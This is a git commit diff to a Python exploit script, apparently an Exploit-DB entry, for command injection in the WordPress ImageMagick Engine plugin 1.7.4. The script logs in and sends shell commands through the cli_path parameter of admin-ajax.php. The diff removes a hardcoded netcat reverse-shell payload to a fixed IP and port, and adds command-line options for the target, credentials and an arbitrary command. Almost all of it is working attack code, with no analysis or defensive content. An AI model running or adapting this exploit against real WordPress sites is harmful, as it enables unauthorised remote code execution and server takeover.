38d108e235a9ab34ae4d617dd02ad56a663adc23
Kabir <44284877+kabir0x23@users.noreply.github.com>
2023-03-30 21:49:06 +0530

    Update EDB-ID-51025.py

--- EDB-ID-51025.py
+++ EDB-ID-51025.py
@@ -1,9 +1,25 @@
 #!/usr/bin/ python
 
 from pwn import *
-from sys import exit
+from sys import exit, argv
 import requests
 import subprocess
+import argparse
+import urllib.parse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--domain", dest="domain", help="Domain URL Address.")
+    parser.add_argument("-u", "--username", dest="username", help="Login Username.")
+    parser.add_argument("-p", "--password", dest="password", help="Login Password.")
+    parser.add_argument("-c", "--command", dest="command", help="""
+    CLI Commands:
+        -- payload on windows: d&calc.exe&anything
+        -- on unix : notify-send 'done'
+    """)
+    options = parser.parse_args()
+    return options
 
 
 class Exploit:
@@ -14,12 +30,12 @@ class Exploit:
         self.password = password
         self.rce_command = rce_command
         self.p = log.progress("checking")
-        self.local_port = 1337
 
     def check_version(self):
         r = requests.get(self.url+"/wp-content/plugins/imagemagick-engine/readme.txt")
         if "1.7.5" in r.text:
             self.p = log.warn("not vulnerable")
+            exit(0)
         elif "Stable tag: 1.7.4" in r.text:
             self.p = log.progress("vulnerable to rce")
 
@@ -30,30 +46,41 @@ class Exploit:
             "log": {self.username},
             "pwd": {self.password},
         }
-        login_session = self.session.post(login_url, data=login_data)
-        if "Error:" in login_session.text:
-            self.p = log.warn("login failed!")
-        if "Error:" not in login_session.text:
-            self.p = log.progress("Successfully logged in")
+        try:
+            login_session = self.session.post(login_url, data=login_data)
+            if "Error:" in login_session.text:
+                self.p = log.warn("login failed!")
+                exit(0)
+            if "Error:" not in login_session.text:
+                self.p = log.progress("Successfully logged in")
 
-    # def nc_server(self):
-    #     subprocess.call(["nc", "-nlvp", str(self.local_port)])
+        except KeyboardInterrupt:
+            log.success("Exiting..")
 
     def rce_exploit(self):
-        self.p = log.progress("Shell done")
+        try:
+            self.p = log.progress("getting into shell")
+            rce_command = urllib.parse.quote(self.rce_command)
+            commands_for_linux = f"cli_path=d%3B{rce_command}%3Bwhoami"
+            commands_for_windows = f"cli_path=d%26{self.rce_command}%26whoami"
+            vuln_url = f"/wp-admin/admin-ajax.php?action=ime_test_im_path&{commands_for_linux}"
+            rce_payload = self.url + vuln_url
+            self.session.get(rce_payload)
 
-        vuln_param = f"cli_path=d%3B{self.rce_command}%3Bwhoami"
-        vuln_url = f"/wp-admin/admin-ajax.php?action=ime_test_im_path&{vuln_param}"
-        rce_payload = self.url + vuln_url
-        self.session.get(rce_payload)
+        except KeyboardInterrupt:
+            log.success("Exiting..")
 
 
 if __name__ == "__main__":
-    url_ip = "http://192.168.228.143"
-    rce_command = "rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.228.128%201337%20%3E%2Ftmp%2Ff"
-    exploit = Exploit(url_ip, "wordpress", "wordpress", rce_command)
+    options = get_arguments()
+
+    url_ip = options.domain
+    wordpress_username = options.username
+    wordpress_password = options.password
+    rce_command = options.command
+    exploit = Exploit(url_ip, wordpress_username, wordpress_password, rce_command)
+
     exploit.check_version()
     exploit.login()
-    # exploit.nc_server()
     exploit.rce_exploit()
-
+    
